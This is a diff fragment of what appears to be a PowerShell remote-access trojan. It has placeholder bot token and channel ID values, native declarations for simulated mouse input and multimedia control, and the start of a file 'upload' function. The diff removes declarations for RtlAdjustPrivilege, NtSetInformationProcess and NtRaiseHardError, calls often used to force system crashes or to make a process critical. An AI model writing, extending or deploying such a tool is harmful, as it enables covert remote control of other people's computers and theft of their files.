@@ -2,7 +2,7 @@ $token = "REPLACE_THESE"
 $cid = "REPLACE_THESE"
 
 Add-Type -A System.Net.Http, System.Windows.Forms, System.Drawing, System.Device, UIAutomationClient, UIAutomationTypes
-add-type 'using System;using System.Runtime.InteropServices;public class win {[DllImport("user32.dll")]public static extern void mouse_event(uint dwFlags,uint dx,uint dy,uint dwData,UIntPtr dwExtraInfo);[DllImport("ntdll.dll")]public static extern int RtlAdjustPrivilege(uint Privilege, bool Enable, bool Client, ref bool CurrentState);[DllImport("ntdll.dll")]public static extern uint NtSetInformationProcess(IntPtr ProcessHandle, uint ProcessInformationClass, ref uint ProcessInformation, uint ProcessInformationLength);[DllImport("ntdll.dll")]public static extern int NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, ref uint Response);[DllImport("winmm.dll")]public static extern int mciSendString(string command, System.Text.StringBuilder buffer, int bufferSize, IntPtr hwndCallback);}'
+add-type 'using System;using System.Runtime.InteropServices;public class win {[DllImport("user32.dll")]public static extern void mouse_event(uint dwFlags,uint dx,uint dy,uint dwData,UIntPtr dwExtraInfo);[DllImport("winmm.dll")]public static extern int mciSendString(string command, System.Text.StringBuilder buffer, int bufferSize, IntPtr hwndCallback);}'
 
 function upload {
 	param($file)
